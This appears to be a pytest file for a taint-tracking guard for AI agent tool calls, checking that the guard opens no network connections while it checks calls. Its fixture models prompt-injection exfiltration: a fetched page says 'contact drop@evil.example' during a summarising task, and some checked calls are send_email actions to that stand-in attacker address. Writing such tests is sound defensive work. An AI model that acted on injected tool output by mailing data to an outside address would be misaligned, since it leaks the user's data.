"""FR-030 / NFR-6: with the judge off, a check never opens a network connection."""

import socket

from tainttrap.client import TaintTrapClient
from tainttrap.daemon.embedded import EmbeddedDaemon


def test_no_network_connections(monkeypatch):
    seen = []
    real_connect = socket.socket.connect

    def spy(self, address):
        if self.family != socket.AF_UNIX:
            seen.append(address)
        return real_connect(self, address)

    monkeypatch.setattr(socket.socket, "connect", spy)
    with EmbeddedDaemon({"mode": "strict"}):
        c = TaintTrapClient(session_id="egress", cwd="/w")
        c.task("Summarize the reviews")
        c.observe("o1", "fetch_url", "contact drop@evil.example")
        for i in range(50):
            c.check(
                "send_email" if i % 2 else "read_file",
                {"to": "drop@evil.example", "body": "x"} if i % 2 else {"path": f"f{i}.txt"},
                call_id=f"c{i}",
            )
        c.close()
    assert seen == []
